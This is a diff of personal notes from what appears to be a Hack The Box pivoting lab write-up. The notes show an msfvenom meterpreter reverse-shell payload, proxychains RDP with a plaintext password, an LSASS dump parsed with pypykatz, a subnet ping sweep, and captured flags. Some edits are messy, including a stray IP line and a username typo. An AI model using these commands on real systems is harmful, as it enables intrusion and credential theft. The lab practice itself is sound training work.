@@ -65,7 +65,7 @@ username
 ```go
 p0wny
 ```
-password
+hostname
 ```go
 shell
 ```
@@ -141,9 +141,9 @@ This box is the pivot host.
 
 Generate msfvenom payload
 ```go
-bundle exec msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.129.229.129 -f elf -o backupjob LPORT=8080
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.129.28.230 -f elf -o backupjob LPORT=8080
 ```
-
+172.16.6.35
 Copy backupjob to webadmin server
 ```go
 scp -i id_rsa backupjob webadmin@10.129.229.129:/tmp
@@ -179,7 +179,7 @@ REMINDER
 Facts:
 - There is no route from my attack host to this internal subnet
 - The pivot host has access to both the 172.16.5.0/23 range and the the 10.0.0.0/8 range
-- I need to establish a proxy on the attack host so that I can reach the 172.16.5.35 machine
+- I need to establish a proxy on my host so that I can reach the 172.16.5.35 machine
 
 ### Configure MSF's SOCKS Proxy
 
@@ -287,14 +287,43 @@ S1ngl3-Piv07-3@sy-Day
 ```
 ![[Dans Field Manual/5-Lateral Movement/Skill Assessment/screenshots/flag.png]]
 
+Created DUMP file at:
+
+```go
+C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
+```
+
+```go
+proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:SkillShare,/home/dan/Desktop/HTB/12-Pivoting-Tunneling-PortForwarding
+```
+
+```go
+pypykatz lsa minidump lsass.DMP
+```
 
 In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
 ```go
+vfrank
 ```
 
-Download mimikatz and extract the project
+On the 172.16.5.35 host, while logged in as `mlfey`, find the IP range and ping other IPs within the subnet
 ```go
-wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
+```
+
+![[Pasted image 20260324214850.png]]
+
+Got a reply for:
+```go
+172.16.6.35
+```
+
+Use RDP on the machine you're already RDP'd into, to log into vfrank's account.
+
+
+For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
+```go
+N3tw0rk-H0pp1ng-f0R-FuN
 ```
 
 
